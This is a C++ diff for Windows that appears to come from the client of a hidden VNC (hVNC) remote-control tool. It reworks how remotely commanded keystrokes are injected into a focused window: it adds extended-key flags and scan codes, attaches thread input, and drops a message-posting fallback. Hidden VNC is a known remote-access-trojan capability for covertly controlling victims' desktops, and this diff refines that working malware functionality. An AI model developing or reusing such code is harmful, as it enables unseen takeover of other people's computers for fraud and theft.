@@ -783,7 +783,16 @@ static bool send_key_input(WORD vk, bool down) {
     INPUT input{};
     input.type = INPUT_KEYBOARD;
     input.ki.wVk = vk;
-    input.ki.dwFlags = down ? 0 : KEYEVENTF_KEYUP;
+    input.ki.wScan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
+    input.ki.dwFlags = (down ? 0 : KEYEVENTF_KEYUP);
+
+    if (vk == VK_INSERT || vk == VK_DELETE || vk == VK_HOME || vk == VK_END ||
+        vk == VK_PRIOR || vk == VK_NEXT || vk == VK_UP || vk == VK_DOWN ||
+        vk == VK_LEFT || vk == VK_RIGHT || vk == VK_NUMLOCK || vk == VK_SNAPSHOT ||
+        vk == VK_DIVIDE || vk == VK_RCONTROL || vk == VK_RMENU) {
+        input.ki.dwFlags |= KEYEVENTF_EXTENDEDKEY;
+    }
+
     return SendInput(1, &input, sizeof(INPUT)) == 1;
 }
 
@@ -801,6 +810,12 @@ static bool send_unicode_input(WCHAR ch) {
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+    if (vk == VK_INSERT || vk == VK_DELETE || vk == VK_HOME || vk == VK_END ||
+        vk == VK_PRIOR || vk == VK_NEXT || vk == VK_UP || vk == VK_DOWN ||
+        vk == VK_LEFT || vk == VK_RIGHT || vk == VK_NUMLOCK || vk == VK_SNAPSHOT ||
+        vk == VK_DIVIDE || vk == VK_RCONTROL || vk == VK_RMENU) {
+        lp |= 0x01000000; // Extended key bit
+    }
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -957,12 +972,14 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = g_hCurrentFocus;
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetForegroundWindow();
+            HWND hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
-            SetForegroundWindow(GetAncestor(hTarget, GA_ROOT));
-            SetFocus(hTarget);
+            DWORD targetThreadId = GetWindowThreadProcessId(hTarget, NULL);
+            DWORD currentThreadId = GetCurrentThreadId();
+
+            // Sync thread input state (capslock, shift etc)
+            AttachThreadInput(currentThreadId, targetThreadId, TRUE);
 
             bool sendInputOk = false;
             if (action == "hvnc_keydown") {
@@ -970,14 +987,20 @@ static void input_loop() {
             } else if (action == "hvnc_keyup") {
                 sendInputOk = send_key_input((WORD)vk, false);
             } else if (action == "hvnc_char") {
+                // If we use hvnc_char, we might want to skip standard key processing
+                // to avoid double characters if the app reacts to both.
+                // For now, let's just send unicode input.
                 sendInputOk = send_unicode_input((WCHAR)vk);
             }
+
+            AttachThreadInput(currentThreadId, targetThreadId, FALSE);
+
             if (!sendInputOk) {
                 client_log("SendInput failed action=" + action +
                            " vk=" + to_string(vk) +
                            " error=" + to_string(GetLastError()));
             }
-            post_key_fallback(hTarget, vk, action);
+            // post_key_fallback(hTarget, vk, action); // Removing fallback to prevent double characters
             g_forceFullFrame = true;
             continue;
         }
